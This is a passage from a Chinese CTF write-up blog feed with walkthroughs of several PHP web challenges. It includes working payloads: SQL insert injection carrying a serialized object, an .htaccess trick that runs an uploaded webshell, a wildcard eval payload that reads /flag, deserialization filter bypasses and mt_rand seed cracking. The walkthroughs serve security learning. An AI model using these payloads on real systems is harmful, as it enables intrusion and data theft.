file!!!&lt;/p&gt;&quot;</span>);        &#125;        $title = str_replace(<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;&#x27;</span>,$filename);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;$title,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;$ext,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-keyword">$this</span>-&gt;folder.$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(!$data || !is_array($data))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        $id = <span class="hljs-keyword">$this</span>-&gt;insert_array($data);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        $con = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);        <span class="hljs-keyword">if</span> (mysqli_connect_errno($con))         &#123;             <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());        &#125;        $sql_fields = <span class="hljs-keyword">array</span>();        $sql_val = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $key=&gt;$value)&#123;            $key_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $key);            $value_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $value);            $sql_fields[] = <span class="hljs-string">&quot;`&quot;</span>.$key_temp.<span class="hljs-string">&quot;`&quot;</span>;            $sql_val[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.$value_temp.<span class="hljs-string">&quot;&#x27;&quot;</span>;        &#125;        $sql = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_fields)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_val)).<span class="hljs-string">&quot;)&quot;</span>;        mysqli_query($con, $sql);        $id = mysqli_insert_id($con);        mysqli_close($con);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params">$path</span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;ifview == <span class="hljs-literal">False</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;            <span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span>        &#125;        $content = file_get_contents($path);        <span class="hljs-keyword">echo</span> $content;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment"># Read some config html</span>        <span class="hljs-keyword">$this</span>-&gt;view_files(<span class="hljs-keyword">$this</span>-&gt;config);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>最后的这里可以利用<br><img src="https://ftp.bmp.ovh/imgs/2021/05/3e66365debf75d92.png"></p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">true</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;/flag&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> helper();<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>然后是sql <code>insert </code> 注入   </p><p>正常上传图片的sql语句为<br><code>INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;TIM截图20191102114857&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code>    </p><p>其中title没有做什么处理<br>所以构造<code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</code><br>文件名不能有双引号，所以进行十六进制编码    </p><p>上传图片，用burp改一下文件名，在<code>show.php</code>得到flag     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7518b270a41d8eaa.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>serialize</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wicctf</title>
    <link href="/2021/05/11/wicctf/"/>
    <url>/2021/05/11/wicctf/</url>
    
    <content type="html"><![CDATA[<h2 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h2><p>文件上传题<br>给了源码，其中有些配置文件看不懂，放弃了   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7f3a08ef5c52084e.png">     </p><p>一开始上传PHP文件，上传成功了，但访问返回了文件中的内容，应该是没有解析PHP文件     </p><p>这时候就应该找apache中的相关配置了    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ba7dc9869ba2aa96.png">      </p><p>这个设为了<code>off</code>会限制目录下的PHP文件没有执行权限<br><img src="https://ftp.bmp.ovh/imgs/2021/05/248d2e75b77fddd4.png">        </p><p>通过传入<code>.htaccess</code>文件来覆盖配置文件中的设置（<code>.htaccess</code>文件作用所在的目录和所有子目录，指令按查找顺序依次生效，所以子目录下的<code>.htaccess</code>可能会覆盖父目录下或者配置文件中的指令）      </p><pre><code>&lt;Files &quot;*.gif&quot;&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-phpphp_flag engine on&lt;/Files&gt;</code></pre><p><code>&lt;file&gt;</code>标签比<code>&lt;directory&gt;</code>优先级高     </p><p>然后上传一句话木马，文件后缀名改为<code>.gif</code>      </p><p>蚁剑连上也没用，有<code>disable_function</code>,访问一句话文件<code>var_dump(file_get_contents(&#39;/flag&#39;));</code>可以<img src="https://ftp.bmp.ovh/imgs/2021/05/4364ac2b513673d6.png">        </p><p><a href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a>    </p><h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><p>php代码审计   </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fighting!&#x27;</span>);     &#125;    <span class="hljs-keyword">eval</span>($code);&#125;</code></pre></code></pre><p>过滤了字母数字还有<code>_@$</code>    </p><p>试了下异或，不行；url取反也不行，就没招了…….      </p><p><code>通配符</code><br><code>/bin/cat /flag</code>——-&gt;<code>/???/??? /????</code>    </p><p>payload:<code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c411a626c7ac6ef0.png">    </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">无字母数字webshell之提高篇—P神</a></p><h2 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e826621caaab1102.png">       </p><p>停电了会发生什么    </p><p>未完成的文件，提示<code>swp</code>泄露，当时看到这句话没啥感觉，找了找其他也没啥，就去扫目录了      </p><p>扫到<code>.index.php.swp</code>       </p><p>swp文件拖到Linux回复一下<code>vi -r .index.php.swp</code>      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>&#123;        <span class="hljs-comment">// initialise variables</span>        <span class="hljs-keyword">$this</span>-&gt;initMsg=<span class="hljs-string">&quot;#--session started--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;exitMsg=<span class="hljs-string">&quot;#--session end--#\n&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;logFile =  $file;        readfile(<span class="hljs-keyword">$this</span>-&gt;logFile);            &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">$msg</span>)</span>&#123;        $fd=fopen(<span class="hljs-keyword">$this</span>-&gt;logFile,<span class="hljs-string">&quot;a+&quot;</span>);        fwrite($fd,$msg.<span class="hljs-string">&quot;\n&quot;</span>);        fclose($fd);    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span>&#123;    <span class="hljs-keyword">public</span> $weblogfile;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        $flag=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$flag</span>&quot;</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment">// self::waf($this-&gt;filepath);</span>        $obj = <span class="hljs-keyword">new</span> logger(<span class="hljs-keyword">$this</span>-&gt;weblogfile);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params">$str</span>)</span>&#123;        $str=preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);        $str=str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$str);        <span class="hljs-keyword">return</span> $str;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;    &#125;&#125;$log = $_GET[<span class="hljs-string">&#x27;log&#x27;</span>];$log = preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$log);$log = str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$log);$log_unser = unserialize($log);<span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;body&gt;&lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="hljs-number">14</span>级大风停电了.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></code></pre><p><code>readfile</code>  、 flag在<code>/flag</code>      </p><p>链<code>new weblog--&gt;wakeup--&gt;logger--&gt;__construct</code>只要将<code>$weblogfile=&#39;/flag&#39;</code>即可       </p><p>flag过滤了，双写即可绕过    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $logFile;    <span class="hljs-keyword">public</span> $initMsg;    <span class="hljs-keyword">public</span> $exitMsg;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $weblogfile=<span class="hljs-string">&#x27;/flag&#x27;</span>;&#125;$a=<span class="hljs-keyword">new</span> weblog();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>payload：<code>?log=O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flflagag&quot;;&#125;</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c6d9e931038e0740.png">      </p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);    session_start();    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-literal">false</span>;    <span class="hljs-keyword">if</span>($url)    &#123;    $a = preg_match(<span class="hljs-string">&quot;/file|dict/i&quot;</span>, $url);        <span class="hljs-keyword">if</span> ($a==<span class="hljs-number">1</span>)        &#123;            <span class="hljs-keyword">exit</span>();        &#125;            $ch = curl_init();            curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&quot;url&quot;</span>]);            curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);            curl_exec($ch);            curl_close($ch);    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>SSRF    </p><p><code>利用gopher协议攻击已知用户名无密码的Mysql</code>  </p><p>算了，环境也关了，附上<br><a href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">宸极实验室的WP</a>    </p><p>还有一道GO语言的题…….完全不懂…..</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>wicctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>wicctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>StrongestMind</title>
    <link href="/2021/05/10/BUU85/"/>
    <url>/2021/05/10/BUU85/</url>
    
    <content type="html"><![CDATA[<h2 id="PY"><a href="#PY" class="headerlink" title="PY"></a>PY</h2><p>打开环境 </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/0d2f6b843629e1dc.png"></p><p>python脚本      </p><p>还不会写，研究下大佬的      </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">count</span>():</span>    s = requests.session()       <span class="hljs-comment">#会话保持</span>    url = <span class="hljs-string">&#x27;http://ee15b87d-2094-4459-97e9-6c7d3f88800d.node3.buuoj.cn/&#x27;</span>    match = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;[0-9]+ [+|-] [0-9]+&quot;</span>)  <span class="hljs-comment">#正则匹配   +：匹配前面的表达式一次或多次</span>    r = s.get(url)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1001</span>):        sleep(<span class="hljs-number">0.1</span>)        <span class="hljs-built_in">str</span> = match.findall(r.text)[<span class="hljs-number">0</span>]        print(<span class="hljs-built_in">str</span>)        <span class="hljs-comment"># print(eval(str))</span>        data = &#123;<span class="hljs-string">&quot;answer&quot;</span> : <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>)&#125;   <span class="hljs-comment">#eval执行</span>        r = s.post(url, data=data)        r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span>        print(<span class="hljs-string">&#x27;&#123;&#125; : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>)))        <span class="hljs-comment"># print(r.text)</span>    print(r.text)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    count()</code></pre></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>python</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ezaudit</title>
    <link href="/2021/05/08/BUU84/"/>
    <url>/2021/05/08/BUU84/</url>
    
    <content type="html"><![CDATA[<h2 id="0"><a href="#0" class="headerlink" title="-0-)"></a>-0-)</h2><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e304316d-4424-4850-b53e-7392e0c5c05e.png" alt="01.png">     </p><p>题目打开是这样，挺正经的，以为是什么漏洞，源码中也没有提示     </p><p>看一眼题目名<code>Ezaudit</code>简单的审计     </p><p>哦   </p><p><code>www.zip</code>  </p><p>果然   </p><p>下载下来是<code>index.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;    $username = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];    $password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];    $Private_key = $_POST[<span class="hljs-string">&#x27;Private_key&#x27;</span>];    <span class="hljs-keyword">if</span> (($username == <span class="hljs-string">&#x27;&#x27;</span>) || ($password == <span class="hljs-string">&#x27;&#x27;</span>) ||($Private_key == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;        <span class="hljs-keyword">exit</span>;&#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($Private_key != <span class="hljs-string">&#x27;*************&#x27;</span> )    &#123;        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;        <span class="hljs-keyword">exit</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span>($Private_key === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;        $getuser = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>;         $link=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,$link);        $result = mysql_query($getuser);        <span class="hljs-keyword">while</span>($row=mysql_fetch_assoc($result))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;        &#125;    &#125;    &#125;&#125; <span class="hljs-comment">// genarate public_key </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>) </span>&#123;    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )    $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $public_key;  &#125;  <span class="hljs-comment">//genarate private_key</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>) </span>&#123;    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )    $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $private_key;  &#125;  $Public_key = public_key();  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></code></pre></code></pre><p>首先要获取到<code>private_key</code>    </p><p>之前也做过一道<code>mt_rand</code>的题目，那一道是根据前几位得到<code>seed</code>      </p><p>这次用<code>public_key</code>得到<code>seed</code>这两个应该是同一个<code>seed</code>吧   </p><p>不过这次用之前的脚本转换时爆不出来     </p><p>找了一个新的脚本     </p><p>发现少了一位，我之前那道题是怎么做出来的！！！？？？   </p><p>PHP版：     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pass=<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>;$str=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;$result=<span class="hljs-string">&#x27;&#x27;</span>;$len1=strlen($pass);$len2=strlen($str)<span class="hljs-number">-1</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len1;$i++)&#123;    <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;$j&lt;$len2+<span class="hljs-number">1</span>;$j++)    &#123;        <span class="hljs-keyword">if</span>($pass[$i]===$str[$j])        &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$j</span> <span class="hljs-subst">$j</span> 0 <span class="hljs-subst">$len2</span> &quot;</span>;            <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>python版：    </p><pre><code><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span>s = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>key = <span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>m = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):        <span class="hljs-keyword">if</span> i == s[j]:            m += <span class="hljs-string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(j,j,<span class="hljs-built_in">len</span>(s)<span class="hljs-number">-1</span>)print(m)</code></pre></code></pre><p>转换后的结果：      </p><pre><code>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61      </code></pre><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/bd326a1b-2d71-4537-b51c-fdfe509f1aaa.png" alt="02.png">      </p><p>注意这里的PHP版本为<code>5.2.1 to 7.0.x</code>如果版本不对的话，生成的也不一样。</p><p>重新生成<code>private_key</code>        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>mt_srand(<span class="hljs-number">1775196155</span>);<span class="hljs-comment">// genarate public_key </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>)</span><span class="hljs-function"></span>&#123;    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)        $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $public_key;&#125;<span class="hljs-comment">//genarate private_key</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>)</span><span class="hljs-function"></span>&#123;    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)        $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $private_key;&#125;<span class="hljs-keyword">echo</span> public_key().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> private_key();</code></pre></code></pre><p>得到：     </p><pre><code>KVQP0LdJKRaV3n9DXuNhoueCDCGc   </code></pre><p>sql万能公式得到flag：     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/654d7ca9-db67-400a-b992-0afefb8809be.png" alt="03.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>mt_srand</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bestphp&#39;s Revenge</title>
    <link href="/2021/05/06/BUU83/"/>
    <url>/2021/05/06/BUU83/</url>
    
    <content type="html"><![CDATA[<h2 id="Knowledge"><a href="#Knowledge" class="headerlink" title="Knowledge"></a>Knowledge</h2><ul><li>PHP中SESSION反序列化   <ul><li>PHP中的session中的内容是以文件的方式存储的，并不是存于内存中，存储方式由配置项<code>session.save_handler</code>控制，默认文件。</li><li>文件以sess_sessionid进行命名，文件的内容是session值序列化后的内容</li><li>在<code>php.ini</code>中存在三项配置：</li><li><code>session.save_path=&quot;&quot;</code>   –设置session的存储路径     </li><li><code>session.save_handler=&quot;&quot; </code>–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)       </li><li><code>session.serialize_handler   string</code> –定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)    </li><li><code>session.serialize_handler</code>存在三种模式   </li><li><code>php_binary</code>—&gt;键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e340b98b-eff6-43b5-b50a-ab8ee414d4f3.png" alt="03.png">        </li><li><code>php</code>—-&gt;键名+竖线（|）+经过serialize()函数处理过的值</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/011a6f2d-5c94-46fc-ba17-8758eeb94a48.png" alt="04.png">       </li><li><code>php_serialize</code>—-&gt;经过serialize()函数处理过的值，会将键名和值当作一个数组序列化   </li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/d4410c44-8d12-4db3-a1cc-8502eeb791d0.png" alt="05.png">   